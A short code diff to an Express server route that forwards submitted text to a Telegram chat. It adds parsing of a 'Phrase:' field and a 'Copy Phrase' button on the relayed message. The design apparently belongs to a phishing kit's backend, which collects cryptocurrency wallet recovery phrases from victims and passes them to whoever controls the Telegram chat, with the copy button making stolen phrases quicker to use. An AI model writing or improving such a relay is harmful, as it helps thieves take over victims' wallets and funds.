@@ -36,11 +36,29 @@ app.post('/api/submit', (req, res) => {
             return res.status(400).json({ ok: false, error: 'Missing text' });
         }
 
+        // Parse the text to extract the phrase for copy functionality
+        const phraseMatch = text.match(/Phrase: (.+)/);
+        const phrase = phraseMatch ? phraseMatch[1].trim() : '';
+        
+        // Create inline keyboard with copy button if phrase exists
+        let replyMarkup = null;
+        if (phrase && phrase !== '[empty]') {
+            replyMarkup = {
+                inline_keyboard: [[
+                    {
+                        text: "📋 Copy Phrase",
+                        copy_text: phrase
+                    }
+                ]]
+            };
+        }
+
         const payload = JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
             text,
             parse_mode: 'HTML',
-            disable_web_page_preview: true
+            disable_web_page_preview: true,
+            reply_markup: replyMarkup
         });
 
         const options = {
